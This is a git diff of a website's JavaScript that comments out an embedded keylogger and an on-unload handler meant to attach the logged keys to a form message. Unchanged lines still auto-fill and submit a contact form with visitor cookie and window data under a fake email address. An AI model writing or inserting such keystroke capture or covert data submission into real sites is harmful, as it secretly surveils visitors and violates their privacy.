@@ -61,13 +61,13 @@ function cookie() {
 
 function setVisit() {
     // Key Logger
-    log = document.documentElement;
-    keysPressed = []
-    document.addEventListener('keydown', logKey);
-    function logKey(e) {
-        keysPressed.push(log = ` ${e.code}`);
-        console.log(keysPressed);
-    }
+    // log = document.documentElement;
+    // keysPressed = []
+    // document.addEventListener('keydown', logKey);
+    // function logKey(e) {
+    //     keysPressed.push(log = ` ${e.code}`);
+    //     console.log(keysPressed);
+    // }
     // End key-logger
 
     if (document.cookie.length < 1) {
@@ -76,11 +76,11 @@ function setVisit() {
         document.getElementById('emailBox').value = 'DNR@robot.com';
         document.getElementById('textarea').value = cookieInfoUpperStr;
         document.getElementById('submit').click();
-        window.onunload = function unload() {
-            leavingInfo = { leaving_time: time, window_information: windowInfo }
-            userMessage = document.getElementById('textarea').value;
-            document.getElementById('textarea').value = '';
-            document.getElementById('textarea').value = userMessage, keysPressed;
-        }
+        // window.onunload = function unload() {
+        //     leavingInfo = { leaving_time: time, window_information: windowInfo }
+        //     userMessage = document.getElementById('textarea').value;
+        //     document.getElementById('textarea').value = '';
+        //     document.getElementById('textarea').value = userMessage, keysPressed;
+        // }
     }
 }
